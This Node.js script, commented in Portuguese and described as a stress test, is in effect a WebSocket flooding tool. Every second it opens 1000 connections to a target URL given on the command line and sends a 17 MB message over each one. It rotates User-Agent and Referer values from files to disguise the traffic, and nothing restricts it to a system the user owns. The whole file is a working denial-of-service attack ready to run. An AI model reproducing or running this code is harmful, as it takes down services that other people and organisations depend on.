const fs = require('fs');
const WebSocket = require('ws');

// Carregar User Agents e Referers dos arquivos
const userAgents = fs.readFileSync('useragents.txt', 'utf8').split('\n');
const referers = fs.readFileSync('referers.txt', 'utf8').split('\n');

// Função para enviar WebSockets com amplificação de tráfego em loop
function sendWebSocketsInLoop(url, numSockets, duration) {
  let intervalId;
  let elapsedTime = 0;

  function getRandomElement(array) {
    return array[Math.floor(Math.random() * array.length)];
  }

  function createSockets() {
    for (let i = 0; i < numSockets; i++) {
      const socket = new WebSocket(url, {
        headers: {
          'User-Agent': getRandomElement(userAgents),
          'Referer': getRandomElement(referers)
        }
      });

      socket.onopen = () => {
        console.log(`WebSocket ${i+1} connected`);
        sendLargeMessage(socket);
      };

      socket.onerror = (error) => {
        console.error(`WebSocket ${i+1} error: ${error.message}`);
      };

      socket.onclose = () => {
        console.log(`WebSocket ${i+1} disconnected`);
      };
    }
  }

  function sendLargeMessage(socket) {
    const message = generateLargeMessage();
    socket.send(message);
  }

  function generateLargeMessage() {
    // Gerar uma mensagem grande, por exemplo, uma string de 17MB
    const seventeenMBString = Array(17 * 1024 * 1024).fill('a').join('');
    return seventeenMBString;
  }

  function stopSending() {
    clearInterval(intervalId);
    console.log(`Teste de stress concluído após ${duration} segundos.`);
    process.exit(0);
  }

  intervalId = setInterval(() => {
    elapsedTime += 1;
    console.log(`Tempo decorrido: ${elapsedTime} segundos`);

    if (elapsedTime >= duration) {
      stopSending();
    } else {
      createSockets();
    }
  }, 1000);
}

// Argumentos da linha de comando
const args = process.argv.slice(2);
const url = args[0];
const duration = parseInt(args[1], 10); // Duração em segundos
const numSockets = 1000;

// Verifica se a URL e a duração foram fornecidas corretamente
if (!url || isNaN(duration) || duration <= 0) {
  console.error('Por favor, forneça uma URL válida e uma duração em segundos.');
  process.exit(1);
}

// Inicia o envio de WebSockets e mensagens em loop
sendWebSocketsInLoop(url, numSockets, duration);
